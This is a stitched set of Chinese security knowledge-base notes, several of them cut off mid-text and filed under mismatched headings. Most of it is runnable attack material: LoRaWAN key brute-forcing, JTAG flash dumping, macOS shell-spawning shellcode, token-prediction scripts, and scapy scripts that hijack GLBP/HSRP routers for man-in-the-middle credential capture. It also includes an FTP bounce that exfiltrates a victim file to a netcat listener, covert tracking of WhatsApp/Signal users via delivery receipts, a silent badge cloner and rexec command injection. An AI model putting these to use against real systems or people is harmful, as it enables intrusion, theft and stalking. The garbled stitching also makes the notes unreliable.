--rate 1e6 --sf 7 --session smartcity# Bruteforce AppKey from captured OTAA join-request/accept pairspython3 lorapwn/bruteforce_join.py --pcap smartcity.pcap --wordlist top1m.txt # 工具与参考入口 https://github.com/IOActive/laf # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/漏洞利用与载荷/JTAG 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # JTAG 技术笔记 [!summary] 提炼定位 面向 漏洞利用与载荷 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 快速查找 JTAG 技术笔记 的利用思路、载荷形态或绕过技巧。 先明确目标解析器和约束，再逐步缩小有效 payload。 # 中文提炼 核心目标是把 JTAG 技术笔记 抽象成解析器、过滤器、有效载荷和输出判断。 优先关注：JTAG、JTAGenum、Safer pin hunting and hardware setup、First contact with OpenOCD (scan and IDCODE)、Halting the CPU and dumping memory/flash；payload 变体按编码、分隔符、大小写、协议、上下文逐个改变。 先证明最小触发，再扩大影响；把不可用变体也记录下来以便判断过滤边界。 防御视角补规范化、白名单、沙箱、最小权限、审计和异常响应。 本页已沉淀 6 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 JTAG JTAGenum Safer pin hunting and hardware setup First contact with OpenOCD (scan and IDCODE) Halting the CPU and dumping memory/flash Boundary‑scan tricks (EXTEST/SAMPLE) Modern targets and notes Defenses and hardening (what to expect on real devices) # 核心要点 JTAGenum is a tool you can load on an Arduino-compatible MCU or (experimentally) a Raspberry Pi to brute‑force unknown JTAG pinouts and even enumerate instruction registers. Raspberry Pi: the Pi build exposes fewer usable GPIOs (so scans are slower); check the repo for the current pin map and constraints. s scan for TCK/TMS/TDI/TDO (and sometimes TRST/SRST) x boundary‑scan snapshot of pin states If the device uses SWD/SWJ instead of 4‑wire JTAG, JTAGenum may not detect it; try SWD 工具 or an adapter that supports SWJ‑DP. OpenOCD is the de‑facto OSS for JTAG/SWD. With a supported adapter you can scan the chain and read IDCODEs: See OpenOCD low‑level irscan/drscan for manual TAP interaction when bringing up unknown chains. ESP32‑S3, program or read via OpenOCD helper: For multi‑device chains, set 绕过 on non‑targets or use a board file that defines all TAPs. EXTEST to drive pins (e.g., bit‑bang external SPI flash lines via the MCU to read it offline if board wiring allows). # 命令 / 载荷 / 操作片段 # 1. First contact with OpenOCD (scan and IDCODE) 12openocd -f interface/jlink.cfg -c "transport select jtag; adapter speed 1000" \ -c "init; scan_chain; shutdown" # 2. First contact with OpenOCD (scan and IDCODE) 1openocd -f board/esp32s3-builtin.cfg -c "init; scan_chain; shutdown" # 3. Bind shell from https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html in port 4444 反弹 Shell from https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html. 反弹 Shell to 127.0.0.1:4444 # 命令 / 载荷 / 操作片段 # 1. syscalls 123456#define SYSCALL_CLASS_NONE 0 /* Invalid */#define SYSCALL_CLASS_MACH 1 /* Mach */#define SYSCALL_CLASS_UNIX 2 /* Unix/BSD */#define SYSCALL_CLASS_MDEP 3 /* Machine-dependent */#define SYSCALL_CLASS_DIAG 4 /* Diagnostics */#define SYSCALL_CLASS_IPC 5 /* Mach IPC */ # 2. syscalls 12345678910111213140 AUE_NULL ALL { int nosys(void); } { indirect syscall }1 AUE_EXIT ALL { void exit(int rval); }2 AUE_FORK ALL { int fork(void); }3 AUE_NULL ALL { user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }4 AUE_NULL ALL { user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }5 AUE_OPEN_RWTC ALL { int open(user_addr_t path, int flags, int mode); }6 AUE_CLOSE ALL { int close(int fd); }7 AUE_WAIT4 ALL { int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }8 AUE_NULL ALL { int nosys(void); } { old creat }9 AUE_LINK ALL { int link(user_addr_t path, user_addr_t link); }10 AUE_UNLINK ALL { int unlink(user_addr_t path); }11 AUE_NULL ALL { int nosys(void); } { old execv }12 AUE_CHDIR ALL { int chdir(user_addr_t path); }[...] # 3. Shellcodes 12nasm -f macho64 shell.asm -o shell.old -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib # 4. Shellcodes 1234567# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.shfor c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do echo -n '\\x'$cdone# Another optionotool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g' # 5. Shell 123456789101112bits 64global _main_main: call r_cmd64 db '/bin/zsh', 0r_cmd64: ; the call placed a pointer to db (argv[2]) pop rdi ; arg1 from the stack placed by the call to l_cmd64 xor rdx, rdx ; store null arg3 push 59 ; put 59 on the stack (execve syscall) pop rax ; pop it to RAX bts rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes) syscall # 6. Time-Based Seeds 123456import randomimport timeseed = int(time.time())random.seed(seed)print(random.randint(1, 100)) # 2. Time-Based Seeds 123456789import randomimport time# Seed based on the provided timestampseed = int(time.mktime(time.strptime('2024-11-10 13:37', '%Y-%m-%d %H:%M')))random.seed(seed)# Generate the random numberprint(random.randint(1, 100)) # 3. 工具 123456789$ guidtool -i 95f6e264-bb00-11ec-8833-00155d01ef00 UUID version: 1 UUID time: 2022-04-13 08:06:13.202186 UUID timestamp: 138691299732021860 UUID node: 91754721024 UUID MAC address: 00:15:5d:01:ef:00 UUID clock sequence: 2099 $ guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000 # 4. 工具 1234./mongo-objectid-predict 5ae9b90a2c144b9def01ec37 5ae9bac82c144b9def01ec39 5ae9bacf2c144b9def01ec3a 5ae9bada2c144b9def01ec3b # 5. 工具 12345678910111213141516171819202122def MongoDB_ObjectID(timestamp, process, counter): return "%08x%10x%06x" % ( timestamp, process, counter, ) def reverse_MongoDB_ObjectID(token): timestamp = int(token[0:8], 16) process = int(token[8:18], 16) counter = int(token[18:24], 16) return timestamp, process, counter def check(token): (timestamp, process, counter) = reverse_MongoDB_ObjectID(token) return token == MongoDB_ObjectID(timestamp, process, counter) tokens = ["5ae9b90a2c144b9def01ec37", "5ae9bac82c144b9def01ec39"] for token in tokens: (timestamp, process, counter) = reverse_MongoDB_ObjectID(token) print(f"{token}: {timestamp} - {process} - {counter}") # 6. 工具 123456789101112131415161718import mathimport datetimedef uniqid(timestamp: float) -> str: sec = math.floor(timestamp) usec = round(1000000 * (timestamp - sec)) return "%8x%05x" % (sec, usec)def reverse_uniqid(value: str) -> float: sec = int(value[:8], 16) usec = int(value[8:], 16) return float(f"{sec}.{usec}")tokens = ["6659cea087cd6" , "6659cea087cea"]for token in tokens: t = float(reverse_uniqid(token)) d = datetime.datetime.fromtimestamp(t) print(f"{token} - {t} => {d}") # 7. mt rand 1234./display_mt_rand.php 12345678 123712530069 674417379./reverse_mt_rand.py 712530069 674417379 123 1 # 8. 工具 12reset-tolkien detect 660430516ffcf -d "Wed, 27 Mar 2024 14:42:25 GMT" --prefixes "attacker@example.com" --suffixes "attacker@example.com" --timezone "-7" reset-tolkien sandwich 660430516ffcf -bt 1711550546.485597 -et 1711550546.505134 -o output.txt --token-format="uniqid" # 工具与参考入口 intruder-io/guidtool andresriancho/mongo-objectid-predict Riamse/python-uniqid php/uniqid ambionics/mt rand-reverse AethliosIK/reset-tolkien IDOR through MongoDB Object IDs Prediction：Amey Anekar：August 25, 2020 In GUID We Trust：Daniel Thatcher：October 11, 2022 # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/漏洞利用与载荷/GLBP & HSRP Attacks 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # GLBP & HSRP Attacks 技术笔记 [!summary] 提炼定位 面向 漏洞利用与载荷 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 快速查找 GLBP & HSRP Attacks 技术笔记 的利用思路、载荷形态或绕过技巧。 先明确目标解析器和约束，再逐步缩小有效 payload。 # 中文提炼 核心目标是把 GLBP & HSRP Attacks 技术笔记 抽象成解析器、过滤器、有效载荷和输出判断。 优先关注：GLBP & HSRP Attacks、FHRP Hijacking Overview、Insights into FHRP、GLBP Protocol Insights、GLBP Operations and Load Distribution；payload 变体按编码、分隔符、大小写、协议、上下文逐个改变。 先证明最小触发，再扩大影响；把不可用变体也记录下来以便判断过滤边界。 防御视角补规范化、白名单、沙箱、最小权限、审计和异常响应。 本页已沉淀 10 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 GLBP & HSRP Attacks FHRP Hijacking Overview Insights into FHRP GLBP Protocol Insights GLBP Operations and Load Distribution Key Components and Terminologies in GLBP GLBP Attack Mechanism Executing a GLBP Attack with Loki Passive Explanation of HSRP Hijacking with Command Details Overview of HSRP (Hot Standby Router/Redundancy Protocol) Roles and Terminology in HSRP HSRP Versions HSRP Attack Mechanism Steps for Bypassing HSRP 认证 # 核心要点 GLBP for IPv6 uses multicast FF02::66 over UDP/3222, and the virtual MAC format becomes 0007.b4xx.xxyy (AVF ID is in the last byte). Timing and attack surface remain the same as in IPv4, so hijack techniques still work in dual‑stack networks. An attacker can become the primary router by sending a GLBP packet with the highest priority value (255). This can lead to DoS or MITM attacks, allowing traffic interception or redirection. Craft the 载荷 bytes to mimic the GLBP header (version/opcode/priority/weight/VRID). Looping the frame ensures you win the AVG election if 认证 is absent. Loki can perform a GLBP attack by injecting a packet with priority and weight set to 255. Pre-attack steps involve gathering information like the virtual IP address, 认证 presence, and router priority values using 工具 like Wireshark. Assign a secondary IP address to the attacker's network interface, mirroring the GLBP virtual IP. By following these steps, the attacker positions themselves as a "man in the middle," capable of intercepting and analyzing network traffic, including unencrypted or sensitive data. HSRP Standby Router: A backup router, ready to take over if the active router fails. MD5 认证 only covers the HSRP 载荷；crafted packets can still rate-limit/DoS control planes. NX-OS releases previously allowed DoS against authenticated groups (see Cisco advisory CSCup11309). Executing HSRP Injection with Loki # 命令 / 载荷 / 操作片段 # 1. GLBP Attack Mechanism 1234567from scapy.all import *vip = "10.10.100.254" # learned from sniffingpkt = IP(dst="224.0.0.102")/UDP(dport=3222,sport=3222)/Raw( b"\x01\x00\xff\x64" # Version=1, Opcode=Hello, Priority=255, Weight=100)send(pkt, iface="eth0", loop=1, inter=1) # 2. Executing a GLBP Attack with Loki 1234567891011# Enable promiscuous mode and IP forwardingsudo ip link set eth0 promisc onsudo sysctl -w net.ipv4.ip_forward=1# Configure secondary IP and SNATsudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE# Adjust routingsudo route del defaultsudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100 # 3. HSRP Attack Mechanism 1234567from scapy.all import *vip = "10.10.100.1"pkt = IP(dst="224.0.0.102")/UDP(sport=1985,dport=1985)/Raw( b"\x00\x02\xff\x03\x00\x00\x00\x01" # Hello, priority 255, group 1)send(pkt, iface="eth0", inter=1, loop=1) # 4. Steps for Bypassing HSRP 认证 1tcpdump -w hsrp_traffic.pcap # 5. Steps for Bypassing HSRP 认证 1python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes # 6. Steps for Bypassing HSRP 认证 1john --wordlist=mywordlist.txt hsrp_hashes # 7. Steps for Bypassing HSRP 认证 12sudo ip link set eth0 promisc on sudo sysctl -w net.ipv4.ip_forward=1 # 8. Steps for Bypassing HSRP 认证 12sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0 sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE # 9. Steps for Bypassing HSRP 认证 12sudo route del default sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100 # 10. Steps for Bypassing HSRP 认证 1sudo python2 net-creds.py -i eth0 # 工具与参考入口 Loki Cisco NX-OS HSRP 认证 DoS (CSCup11309) Reddit: HSRP seen on VPS shared VLANs # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/漏洞利用与载荷/Fuzzing 方法论.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Fuzzing 方法论 [!summary] 提炼定位 面向 漏洞利用与载荷 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 快速查找 Fuzzing 方法论 的利用思路、载荷形态或绕过技巧。 先明确目标解析器和约束，再逐步缩小有效 payload。 # 中文提炼 核心目标是把 Fuzzing 方法论 抽象成解析器、过滤器、有效载荷和输出判断。 优先关注：Mutational Grammar Fuzzing: Coverage vs. Semantics、Corpus Diversity Pitfalls、Comparison-Aware Mutation For Magic Values、Stateful Fuzzing: Sequences Are Seeds、Single-Machine Diversity Trick (Jackalope-Style)；payload 变体按编码、分隔符、大小写、协议、上下文逐个改变。 先证明最小触发，再扩大影响；把不可用变体也记录下来以便判断过滤边界。 防御视角补规范化、白名单、沙箱、最小权限、审计和异常响应。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Mutational Grammar Fuzzing: Coverage vs. Semantics Corpus Diversity Pitfalls Comparison-Aware Mutation For Magic Values Stateful Fuzzing: Sequences Are Seeds Single-Machine Diversity Trick (Jackalope-Style) Snapshot Fuzzing For Hard-To-Harness Targets Harness Introspection: Find Shallow Fuzzers Early Graph-First Fuzz Target Selection And Mutation Triage Practical triage workflow Mutation survivors: equivalent vs actionable Correlate external findings onto the graph # 核心要点 Pair it with dictionaries extracted from real samples, protocol specs, or debug logs. A small dictionary with grammar tokens, chunk names, verbs, and delimiters is often more valuable than a massive generic wordlist. If the target performs many sequential checks, solve the earliest “magic” comparisons first and then minimize the resulting corpus again so later stages start from already-valid prefixes. Run the target until the interesting state is ready. For every test case, write the mutated input directly into the relevant guest/process buffer. Execute until crash/timeout/reset. This avoids paying the full setup cost every iteration and is especially useful for network services, firmware, post-auth attack surfaces, and binary-only targets that are painful to refactor into a classic in-process harness. Is the mutated function reachable from an attacker-controlled entrypoint? # 命令 / 载荷 / 操作片段 # 1. Comparison-Aware Mutation For Magic Values 12345678910./configure --cc=afl-clang-fastmakecp ./target ./target.aflmake cleanAFL_LLVM_CMPLOG=1 ./configure --cc=afl-clang-fastmakecp ./target ./target.cmplogafl-fuzz -i in -o out -c ./target.cmplog -- ./target.afl @@ # 2. Single-Machine Diversity Trick (Jackalope-Style) 1/path/to/fuzzer -start_server 127.0.0.1:8337 -out serverout # 3. Harness Introspection: Find Shallow Fuzzers Early 12python3 infra/helper.py introspector libdwarf --seconds=30python3 infra/helper.py introspector libdwarf --public-corpora # 4. Correlate external findings onto the graph 12uv pip install trailmarktrailmark analyze --complexity 10 path/to/project # 5. Correlate external findings onto the graph 123456from trailmark.query.api import QueryEngineengine = QueryEngine.from_directory("path/to/project", language="c")engine.preanalysis()engine.complexity_hotspots(10)engine.paths_between("handle_request", "parse_ipv6") # 工具与参考入口 Mutational grammar fuzzing Jackalope AFL++ Fuzzing in Depth AFLNet Five Years Later: On Coverage-Guided Protocol Fuzzing Trailmark turns code into graphs trailofbits/trailmark # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/漏洞利用与载荷/File Integrity Monitoring 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # File Integrity Monitoring 技术笔记 [!summary] 提炼定位 面向 漏洞利用与载荷 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 快速查找 File Integrity Monitoring 技术笔记 的利用思路、载荷形态或绕过技巧。 先明确目标解析器和约束，再逐步缩小有效 payload。 # 中文提炼 核心目标是把 File Integrity Monitoring 技术笔记 抽象成解析器、过滤器、有效载荷和输出判断。 优先关注：File Integrity Monitoring、Baseline、Real-Time Backends & Blind Spots、Linux、Windows；payload 变体按编码、分隔符、大小写、协议、上下文逐个改变。 先证明最小触发，再扩大影响；把不可用变体也记录下来以便判断过滤边界。 防御视角补规范化、白名单、沙箱、最小权限、审计和异常响应。 本页已沉淀 3 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 File Integrity Monitoring Baseline Real-Time Backends & Blind Spots Linux Windows Containers Attacker-Oriented Hunting Notes 工具 # 核心要点 For example, you can calculate and store the 哈希 of each file of the filesystem to be able to find out which files were modified.\ Periodic re-scan: Rebuild confidence after reboots, dropped events, agent outages, or deliberate anti-forensic activity. Windows 持久化 locations, service binaries, scheduled task files, startup folders If a program replaces a file with write temp -> rename, watching the file itself may stop being useful. Watch the parent directory, not only the file. Example osquery FIM configuration focused on attacker 持久化 paths: Sysmon Event ID 11 is useful for file creation/overwrite. Sysmon Event ID 2 helps detect timestomping. Sysmon Event ID 15 is useful for named alternate data streams (ADS) such as Zone.Identifier or hidden 载荷 streams. Track service definitions and task schedulers as carefully as binaries. Attackers often get 持久化 by modifying a unit file, cron entry, or task XML rather than patching /bin/sshd. A content 哈希 alone is insufficient. Many compromises first show up as owner/mode/xattr/ACL drift. If the attacker has root or kernel execution, assume the FIM agent, its database, and even the event source can be tampered with. Store logs and baselines remotely or on read-only media whenever possible. # 命令 / 载荷 / 操作片段 # 1. Linux 123aide --initmv /var/lib/aide/aide.db.new /var/lib/aide/aide.dbaide --check # 2. Linux 1234567891011121314{ "schedule": { "fim": { "query": "SELECT * FROM file_events;", "interval": 300, "removed": false } }, "file_paths": { "etc": ["/etc/%%"], "systemd": ["/etc/systemd/system/%%", "/usr/lib/systemd/system/%%"], "ssh": ["/root/.ssh/%%", "/home/%/.ssh/%%"] }} # 3. Windows 123fsutil usn queryjournal C:fsutil usn readjournal C:fsutil usn readdata C:\Windows\Temp\sample.bin # 工具与参考入口 AIDE osquery Wazuh FIM / Syscheck Elastic Auditbeat File Integrity Module Sysmon https://osquery.readthedocs.io/en/stable/deployment/file-integrity-monitoring/ https://www.elastic.co/blog/tracing-linux-file-integrity-monitoring-use-case # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 容器与 Kubernetes # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Flipper Zero displays the frequency with the highest RSSI value, with signal strength higher than -90 dBm. The Read option listens on the configured frequency on the indicated modulation: 433.92 AM by default. If something is found when reading, info is given in the screen. This info could be use to replicate the signal in the future. While Read is in use, it's possible to press the left button and configure it.\ The Read Raw option records signals send in the listening frequency. This can be used to steal a signal and repeat it. By default Read Raw is also in 433.92 in AM650, but if with the Read option you found that the signal that interest you is in a different frequency/modulation, you can also modify that pressing left (while inside the Read Raw option). # 工具与参考入口 CC1101 chip dBm https://github.com/tobiabocchi/flipperzero-bruteforce supported protocols https://docs.flipperzero.one/sub-ghz/supported-vendors https://docs.flipperzero.one/sub-ghz/frequencies https://docs.flipperzero.one/sub-ghz # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/漏洞利用与载荷/FZ：NFC 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # FZ：NFC 技术笔记 [!summary] 提炼定位 面向 漏洞利用与载荷 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 快速查找 FZ：NFC 技术笔记 的利用思路、载荷形态或绕过技巧。 先明确目标解析器和约束，再逐步缩小有效 payload。 # 中文提炼 核心目标是把 FZ：NFC 技术笔记 抽象成解析器、过滤器、有效载荷和输出判断。 优先关注：FZ：NFC、Intro <a href="#id-9wrzi" id="id-9wrzi"></a>、Supported NFC cards <a href="#id-9wrzi" id="id-9wrzi"></a>、NFC cards type A <a href="#uvusf" id="uvusf"></a>、Bank card (EMV) <a href="#kzmrp" id="kzmrp"></a>；payload 变体按编码、分隔符、大小写、协议、上下文逐个改变。 先证明最小触发，再扩大影响；把不可用变体也记录下来以便判断过滤边界。 防御视角补规范化、白名单、沙箱、最小权限、审计和异常响应。 本页当前以概念和流程为主；后续实验时可补充最小复现命令和输出样例。 # 关键主题 FZ：NFC Intro <a href="#id-9wrzi" id="id-9wrzi"></a> Supported NFC cards <a href="#id-9wrzi" id="id-9wrzi"></a> NFC cards type A <a href="#uvusf" id="uvusf"></a> Bank card (EMV) <a href="#kzmrp" id="kzmrp"></a> Unknown cards <a href="#id-37eo8" id="id-37eo8"></a> NFC cards types B, F, and V <a href="#wyg51" id="wyg51"></a> Actions Read Reading the UID VS Reading the Data Inside <a href="#reading-the-uid-vs-reading-the-data-inside" id="reading-the-uid-vs-reading-the-data-inside"></a> Read Specific EMV Bank Cards (PayPass, payWave, Apple Pay, Google Pay) <a href="#emv-bank-cards-paypass-paywave-apple-pay-google-pay" id="emv-bank-cards-paypass-paywave-apple-pay-google-pay"></a> # 核心要点 Bank cards (EMV) — only read UID, SAK, and ATQA without saving. Unknown cards — read (UID, SAK, ATQA) and emulate an UID. For NFC cards type B, type F, and type V, Flipper Zero is able to read an UID without saving it. Flipper Zero can only read an UID, SAK, ATQA, and stored data on bank cards without saving. Bank card reading screenFor bank cards, Flipper Zero can only read data without saving and emulating it. When Flipper Zero is unable to determine NFC card's type, then only an UID, SAK, and ATQA can be read and saved. Low-level read — reads only the UID, SAK, and ATQA. Flipper tries to guess the high-level protocol based on this data read from the card. You can't be 100% certain with this, as it is just an assumption based on certain factors. High-level read — reads the data from the card's memory using a specific high-level protocol. That would be reading the data on a Mifare Ultralight, reading the sectors from a Mifare Classic, or reading the card's attributes from PayPass/Apple Pay. # 工具与参考入口 https://blog.flipperzero.one/rfid/ # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

FTP valid 凭据 in the FTP Middle server FTP valid 凭据 in Victim FTP server Both servers accept the PORT command (bounce FTP attack) You can write inside some directory of the FTP Middle server Craft the file the FTP Middle server will send to the Victim server (the 利用 script). This file will be plain text with the needed commands to authenticate against the Victim server, change the directory and 下载 a file to your own server. Padding (dd ...) prevents the control connection from closing before the RETR finishes (large TCP window issue discussed in classic writeups). If the middle server restricts privileged ports, use a high port in PORT and adjust your listener accordingly. Use a bounceable FTP server to port-scan internal hosts when file relay is blocked: Some modern WAF/IDS (e.g., Juniper IPS) ship signatures specifically for FTP: 利用：BOUNCE-ATTACK; noisy 载荷 or missing padding may trip them. When the middle server enforces "PORT to same host" restrictions, place your listener on the middle server itself (if you have write/execute) and forward the captured file later. # 命令 / 载荷 / 操作片段 # 1. Quick check for vulnerable bounce hosts 123nmap -Pn -p21 --script ftp-bounce <middle_ftp_ip># or directly attempt a bounce scannmap -Pn -p80 -b user:pass@<middle_ftp_ip>:21 <internal_target_ip> # 2. Automating the 2nd FTP 下载 1nc -lvnp 2121 > loot.bin # or run a small pyftpdlib server # 3. Automating the 2nd FTP 下载 1234567891011cat > instrs <<'EOF' USER <victim_user> PASS <victim_pass> CWD /path/inside/victim TYPE I PORT A,B,C,D,p1,p2 RETR secret.tar.gz QUIT EOF # Add padding so the control channel stays open on picky daemons dd if=/dev/zero bs=1024 count=60 >> instrs # 4. Automating the 2nd FTP 下载 1234567ftp -n <middle_ftp> <<'EOF' user <middle_user> <middle_pass> put instrs PORT <victim_ip_with_commas>,0,21 RETR instrs QUIT EOF # 5. Extra tricks 1nmap -Pn -p22,80,445 -b anonymous:<email>@<middle_ftp> <internal_ip> # 工具与参考入口 http://www.ouah.org/ftpbounce.html Nmap book – TCP FTP Bounce Scan (-b) CPTS Attacking Common Services – FTP Bounce example (2025) # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Platform-dependent UI behaviour is noted inline. Disable read receipts if needed, but delivery receipts cannot be turned off in WhatsApp or Signal. Creepy companion: already shares a chat with the victim and abuses self-reactions, reaction removals, or repeated edits/deletes tied to existing message IDs. Alternate between a visible emoji and an empty reaction 载荷 (encoded as "" in WhatsApp protobufs or --remove in signal-cli). Each transmission yields a device ack despite no UI delta for the victim. Because WhatsApp/Signal accept unlimited reaction updates, the attacker never needs to post new chat content or worry about edit windows. Send the packet even though no thread exists. The victim devices decrypt it, fail to match the base message, discard the state change, but still acknowledge the incoming ciphertext, sending device receipts back to the attacker. Recent WhatsApp builds also expose Settings -> Privacy -> Advanced -> Block unknown account messages. Treat it as a throughput limiter, not a fix: it mainly hurts sustained stranger-only flooding and is irrelevant once you are already a known contact. Invalid 载荷: Malformed edit bodies or deletes referencing already purged messages elicit the same behaviour—decryption plus receipt, zero user-visible artefacts. If a device is offline, its receipt is queued and emitted upon reconnection. Gaps therefore leak online/offline cycles and even commuting schedules (e.g., desktop receipts stop during travel). Because the sender must retrieve the recipient’s key inventory before encrypting, the attacker can also watch when new devices are paired; a sudden increase in device count or new RTT cluster is a strong indicator. During the real attack, compare the new probe series against the trained clusters. The paper reports that even locations within the same city can often be separated, with >80% accuracy in a 3-location setting. This works best when the attacker controls the sender environment and probes under similar network conditions, because the measured path includes the recipient access network, wake-up latency, and messenger infrastructure. Occupies 密码学 threads and introduces jitter in latency-sensitive features (VoIP, video calls) even though the user never sees notifications. # 命令 / 载荷 / 操作片段 # 1. Manipulating mains-powered equipment and Lithium-ion power-banks can be dangerous. Verify every connection before energising the circuit and keep the antennas, coax and ground planes exactly as they were in the factory design to avoid detuning the reader. HID MaxiProx 5375 reader (or any 12 V HID Prox® long-range reader) The PD trigger negotiates 12 V from the power-bank and feeds it directly to the MaxiProx (the reader natively expects 10–14 V). A secondary 5 V rail is taken from the ESP board to power any accessories. When the switch is open the beeper circuit is broken and the reader operates in complete silence – ideal for covert badge harvesting. Re-install the MaxiProx logic board and re-solder the SMA pigtail to the reader’s PCB ground pad. Using a 125 kHz Pupa test card the portable cloner achieved consistent reads at ≈ 8 cm in free-air – identical to mains-powered operation. Placing the reader inside a thin-walled metal cash box (to simulate a bank lobby desk) reduced range to ≤ 2 cm, confirming that substantial metal enclosures act as effective RF shields. # 工具与参考入口 Let’s Clone a Cloner – Part 3 (TrustedSec) # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

It offers a small, fast multithreaded and transactional database engine with in-memory and disk-based tables and supports embedded and server modes. Note that by default this service is likely running in memory or is bound to localhost. If you found it, you probably exploited another service and are looking to escalate privileges. Anyone with the ability to sniff the network can recover the username, 密码 and command. A final NUL-terminated string with the command to execute is sent. If the 凭据 are valid you will receive the output of id straight back on the same connection. If -p is omitted the client will prompt interactively for the 密码 (visible on the wire in clear-text!). To avoid leaving the 密码 in your shell history /process list, GNU rexec also supports reading it from stdin: This is not safer on the network; it only reduces local exposure on the attacking host. Commands run with the privileges of the supplied user. If /etc/pam.d/rexec is mis-configured (e.g. pam rootok), root shells are sometimes possible. Rexec ignores the user’s shell and executes the command via /bin/sh -c <cmd>. You can therefore use typical shell-escape tricks (;, $( ) , backticks) to chain multiple commands or spawn reverse shells: Passwords are often stored in ~/.netrc or legacy automation scripts on other systems; if you compromise one host you may reuse them for 横向移动: If you must keep it, restrict access with TCP wrappers (/etc/hosts.allow) or firewall rules and enforce strong per-account passwords. Monitor for traffic to :512 and for rexecd process launches. A single packet capture is enough to detect a compromise. # 命令 / 载荷 / 操作片段 # 1. Basic Information 12PORT STATE SERVICE512/tcp open exec # 2. Protocol quick-look 1(echo -ne "0\0user\0password\0id\0"; cat) | nc <target> 512 # 3. Protocol quick-look 12nc -lvnp 4444printf '4444\0user\0password\0id; uname -a\0' | nc <target> 512 # 4. Manual usage with the client 1rexec -l user -p password <target> "uname -a" # 5. Manual usage with the client 1printf '%s\n' 'password' | rexec -l user -p - <target> "id" # 6. Nmap 1234nmap -sV -p 512 <target># 